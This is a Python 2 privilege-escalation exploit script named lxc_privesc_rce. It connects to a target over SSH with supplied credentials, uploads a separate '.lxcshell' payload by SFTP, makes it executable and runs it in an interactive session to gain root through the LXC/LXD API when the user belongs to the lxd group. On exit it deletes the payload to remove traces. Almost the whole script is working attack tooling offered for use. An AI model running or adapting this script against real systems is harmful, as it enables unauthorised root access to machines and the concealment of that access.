#!/usr/bin/env python2
#  -*- coding: utf-8 -*- ###############################################################################################
#                                                                                                                      #
#██╗     ██╗  ██╗ ██████╗    ██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗    ██████╗  ██████╗███████╗          #
#██║     ╚██╗██╔╝██╔════╝    ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝    ██╔══██╗██╔════╝██╔════╝          #
#██║      ╚███╔╝ ██║         ██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗██║         ██████╔╝██║     █████╗            #
#██║      ██╔██╗ ██║         ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║██║         ██╔══██╗██║     ██╔══╝            #
#███████╗██╔╝ ██╗╚██████╗    ██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║╚██████╗    ██║  ██║╚██████╗███████╗          #
#╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝    ╚═╝  ╚═╝ ╚═════╝╚══════╝          #                                                                                                                       #
# lxc_privesc_rce nighter@nighter.se                                                                                   #
#                                                                                                                      #
# DATE                                                                                                                 #
# 14/06/2018                                                                                                           #
#                                                                                                                      #
# DESCRIPTION                                                                                                          #
# ssh's into a machine and privesc to root if you are part of the lxcd group by abuse the lxc api                      #
#                                                                                                                      #
#                                                                                                                      #
# Mikael Kall - nighter@nighter.se                                                                                     #
#                                                                                                                      #
########################################################################################################################

import atexit
import getpass
import paramiko
import pexpect
import signal
import sys
import os

# chdir to script working directory
os.chdir(os.path.realpath(os.path.dirname(sys.argv[0])))

# Bolean on when to cleanup.
CLEANUP = False

# Handler to exist cleanly on ctrl+C
def signal_handler(signal, frame):
    print "\nYou pressed Ctrl+C!"
    cleanup()
    sys.exit()
signal.signal(signal.SIGINT, signal_handler)


def exit_handler():
    global CLEANUP
    if CLEANUP is True:
        cleanup()

atexit.register(exit_handler)

def cleanup():
    ssh = ssh_connect()
    ssh.exec_command("rm -f ./.lxcshell")
    ssh.close()


def ssh_connect():

    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(IP, username=USER, password=PASSWORD, port=PORT)
    except:
        print("Authentication failed.")
        sys.exit(0)

    return ssh

def ssh_upload_and_execute():

    global CLEANUP

    if os.path.isfile('./.lxcshell') is False:
        print("Missing lxcshell it is required for the exploit to work.")
        sys.exit(0)

    ssh = ssh_connect()

    try:
        sftp = ssh.open_sftp()
        sftp.put('./.lxcshell', './.lxcshell')
    except:
        pass

    CLEANUP = True

    ssh.exec_command("chmod a+x ./.lxcshell")
    stdin, stdout, stderr = ssh.exec_command("pwd")
    path = str(stdout.readlines()[0]).strip()

    child = pexpect.spawn('/usr/bin/ssh -p %s %s@%s' % (PORT, USER, IP))
    child.expect('password:', timeout=120)
    child.sendline(PASSWORD)
    child.expect ('.*')
    child.sendline('%s/.lxcshell' % path)
    child.interact()

def print_usage():
    print ("""
██╗     ██╗  ██╗ ██████╗    ██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗    ██████╗  ██████╗███████╗
██║     ╚██╗██╔╝██╔════╝    ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝    ██╔══██╗██╔════╝██╔════╝
██║      ╚███╔╝ ██║         ██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗██║         ██████╔╝██║     █████╗  
██║      ██╔██╗ ██║         ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║██║         ██╔══██╗██║     ██╔══╝  
███████╗██╔╝ ██╗╚██████╗    ██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║╚██████╗    ██║  ██║╚██████╗███████╗
╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝    ╚═╝  ╚═╝ ╚═════╝╚══════╝
[nighter@nighter.se]
    """)
    print "Usage: %s <USERNAME>@<HOST:[PORT]>" % (sys.argv[0])
    sys.exit(0)

if __name__ == '__main__':

    if len(sys.argv) != 2:
        print_usage()

    HOST = sys.argv[1]

    if '@' not in HOST:
        print_usage()
    else:
        USER = HOST.split('@')[0]
        IP = HOST.split('@')[1]

    if ':' in IP:
        PORT = IP.split(':')[1]
        IP = IP.split(':')[0]
    else:
        PORT = 22

    PASSWORD = getpass.getpass('Password:')

    # Upload payload async
    ssh_upload_and_execute()
